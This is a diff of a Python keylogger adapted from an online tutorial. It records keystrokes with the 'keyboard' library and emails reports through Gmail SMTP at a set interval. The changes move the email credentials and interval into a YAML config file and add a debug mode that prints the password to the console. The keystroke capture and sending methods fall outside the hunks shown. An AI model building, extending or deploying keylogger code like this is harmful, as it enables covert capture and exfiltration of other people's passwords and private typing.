@@ -1,13 +1,30 @@
-# https://www.thepythoncode.com/article/write-a-keylogger-python
+#==============================================================================================================
+# (c) 2020 real-4w, based on https://www.thepythoncode.com/article/write-a-keylogger-python
+#==============================================================================================================
 import keyboard # for keylogs 
 import smtplib # for sending email using SMTP protocol (gmail)
-# Semaphore is for blocking the current thread
-# Timer is to make a method runs after an `interval` amount of time
-from threading import Semaphore, Timer
-
-SEND_REPORT_EVERY = 600 # 10 minutes
-EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
+import yaml
+from threading import Semaphore, Timer # Semaphore is for blocking the current thread, Timer is to make a method runs after an `interval` amount of time
+#==============================================================================================================
+# Make sure you have a file called "kl.yaml" in the CWD, containing variables as follows:
+#debug : True
+#time : 600
+#username : <your email>@gmail.com
+#password : <yourpassword | yourapplicationpassword>
+#==============================================================================================================
+def ProcessYAML (yaml_file) :
+    '''This function opens the yaml file and returns the data object'''
+    with open(yaml_file) as f:
+        y_data = yaml.load(f, Loader=yaml.FullLoader)
+        debug = y_data['debug']
+        if debug == True : print("YAML file:\n", y_data)
+    return (y_data, debug) 
+#==============================================================================================================
+yaml_data, debug = ProcessYAML('kl.yaml')                                     #yaml settings are global variables
+#debug = yaml_data['debug'] 
+SEND_REPORT_EVERY = yaml_data['time']
+EMAIL_ADDRESS = yaml_data['username']
+EMAIL_PASSWORD = yaml_data['password']
 
 class Keylogger:
     def __init__(self, interval):
@@ -80,5 +97,7 @@ class Keylogger:
         self.semaphore.acquire()
 
 if __name__ == "__main__":
+    if debug == True :
+        print("Main", SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
